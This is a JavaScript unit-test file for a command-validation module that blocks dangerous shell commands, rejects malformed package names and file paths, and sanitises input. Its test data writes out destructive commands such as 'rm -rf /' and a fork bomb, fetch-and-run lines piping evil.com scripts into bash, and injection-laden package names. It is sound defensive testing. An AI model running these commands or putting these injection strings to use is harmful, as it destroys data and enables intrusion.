#!/usr/bin/env node
/**
 * Unit tests for lib/validation module
 * Tests dangerous command detection and input validation
 */

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  \x1b[32m✓\x1b[0m ${name}`);
    passed++;
  } catch (e) {
    console.log(`  \x1b[31m✗\x1b[0m ${name}: ${e.message}`);
    failed++;
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message || 'Assertion failed');
}

// Load module
const validation = require('../../lib/validation');

// ============================================
// Test: Dangerous Command Detection
// ============================================
console.log('\n\x1b[1mDangerous Command Detection\x1b[0m');

// Commands that SHOULD be blocked
const dangerousCommands = [
  'rm -rf /',
  'rm -rf /home',
  'rm -rf /etc',
  'rm -rf ~',
  'rm -rf ~/*',
  'rm -rf *',
  'DROP DATABASE users',
  'DROP TABLE accounts',
  'TRUNCATE TABLE users',
  'DELETE FROM users;',
  ':(){:|:&};:',
  'mkfs.ext4 /dev/sda',
  'dd if=/dev/zero of=/dev/sda',
  'chmod -R 777 /',
  'curl http://evil.com/script.sh | bash',
  'wget http://evil.com/script.sh | sh',
  'format c:',
  'Remove-Item -Recurse -Force C:\\'
];

for (const cmd of dangerousCommands) {
  test(`blocks: ${cmd.substring(0, 40)}...`, () => {
    assert(validation.isDangerousCommand(cmd), `Should block: ${cmd}`);
  });
}

// Commands that should be ALLOWED
const safeCommands = [
  'ls -la',
  'git status',
  'npm install',
  'python script.py',
  'rm temp.txt',
  'rm -rf /tmp/test',
  'cat /etc/passwd',
  'echo hello',
  'node index.js',
  'SELECT * FROM users',
  'DELETE FROM users WHERE id = 1',
  'chmod 755 script.sh'
];

console.log('\n\x1b[1mSafe Command Allowlist\x1b[0m');

for (const cmd of safeCommands) {
  test(`allows: ${cmd}`, () => {
    assert(!validation.isDangerousCommand(cmd), `Should allow: ${cmd}`);
  });
}

// ============================================
// Test: getDangerReason
// ============================================
console.log('\n\x1b[1mDanger Reason Detection\x1b[0m');

test('getDangerReason returns reason for rm -rf /', () => {
  const reason = validation.getDangerReason('rm -rf /');
  assert(reason !== null, 'Should return a reason');
  assert(typeof reason === 'string', 'Reason should be string');
});

test('getDangerReason returns null for safe command', () => {
  const reason = validation.getDangerReason('ls -la');
  assert(reason === null, 'Should return null for safe command');
});

test('getDangerReason handles non-string', () => {
  const reason = validation.getDangerReason(null);
  assert(reason === null);
});

// ============================================
// Test: Package Name Validation
// ============================================
console.log('\n\x1b[1mPackage Name Validation\x1b[0m');

const validPackageNames = [
  'ruff',
  'mypy',
  'numpy',
  'scikit-learn',
  'flask_cors',
  'Django',
  'requests2',
  'python-dateutil'
];

for (const name of validPackageNames) {
  test(`valid package: ${name}`, () => {
    assert(validation.isValidPackageName(name), `Should accept: ${name}`);
  });
}

const invalidPackageNames = [
  'ruff; rm -rf /',
  'mypy && cat /etc/passwd',
  'package | bash',
  '../../../etc/passwd',
  'package`whoami`',
  '$(cat /etc/passwd)',
  'package name with spaces',
  '-invalid-start'
];

for (const name of invalidPackageNames) {
  test(`rejects invalid package: ${name.substring(0, 30)}`, () => {
    assert(!validation.isValidPackageName(name), `Should reject: ${name}`);
  });
}

// ============================================
// Test: File Path Validation
// ============================================
console.log('\n\x1b[1mFile Path Validation\x1b[0m');

test('valid path returns valid: true', () => {
  const result = validation.validateFilePath('/home/user/file.txt');
  assert(result.valid === true);
});

test('empty path returns valid: false', () => {
  const result = validation.validateFilePath('');
  assert(result.valid === false);
  assert(result.reason.includes('empty'));
});

test('non-string returns valid: false', () => {
  const result = validation.validateFilePath(null);
  assert(result.valid === false);
});

test('path traversal detected', () => {
  const result = validation.validateFilePath('../../../etc/passwd');
  assert(result.valid === false);
  assert(result.reason.toLowerCase().includes('traversal'));
});

test('null byte detected', () => {
  const result = validation.validateFilePath('/path/file.txt\0.exe');
  assert(result.valid === false);
  assert(result.reason.toLowerCase().includes('null'));
});

test('relative path within project allowed', () => {
  const result = validation.validateFilePath('./src/file.js');
  assert(result.valid === true);
});

// ============================================
// Test: Input Sanitization
// ============================================
console.log('\n\x1b[1mInput Sanitization\x1b[0m');

test('sanitizeInput removes semicolons', () => {
  const result = validation.sanitizeInput('cmd; rm -rf /');
  assert(!result.includes(';'));
});

test('sanitizeInput removes pipes', () => {
  const result = validation.sanitizeInput('cmd | bash');
  assert(!result.includes('|'));
});

test('sanitizeInput removes backticks', () => {
  const result = validation.sanitizeInput('cmd `whoami`');
  assert(!result.includes('`'));
});

test('sanitizeInput removes $( )', () => {
  const result = validation.sanitizeInput('cmd $(cat file)');
  assert(!result.includes('$('));
});

test('sanitizeInput removes null bytes', () => {
  const result = validation.sanitizeInput('file.txt\0.exe');
  assert(!result.includes('\0'));
});

test('sanitizeInput trims whitespace', () => {
  const result = validation.sanitizeInput('  cmd  ');
  assert(result === 'cmd');
});

test('sanitizeInput handles non-string', () => {
  const result = validation.sanitizeInput(null);
  assert(result === '');
});

// ============================================
// Test: Stdin Size Check
// ============================================
console.log('\n\x1b[1mStdin Size Check\x1b[0m');

test('small input is valid', () => {
  const result = validation.checkStdinSize('hello world');
  assert(result.valid === true);
  assert(result.size === 11);
});

test('returns size and limit', () => {
  const result = validation.checkStdinSize('test');
  assert(typeof result.size === 'number');
  assert(typeof result.limit === 'number');
  assert(result.limit > 0);
});

test('large input exceeds limit', () => {
  // Create input larger than limit
  const limit = require('../../lib/core/config').MAX_STDIN_SIZE;
  const largeInput = 'x'.repeat(limit + 1);
  const result = validation.checkStdinSize(largeInput);
  assert(result.valid === false);
  assert(result.size > result.limit);
});

// ============================================
// Summary
// ============================================
console.log('\n' + '='.repeat(50));
console.log(`\x1b[1mValidation Unit Tests:\x1b[0m ${passed} passed, ${failed} failed`);
console.log('='.repeat(50));

process.exit(failed > 0 ? 1 : 0);
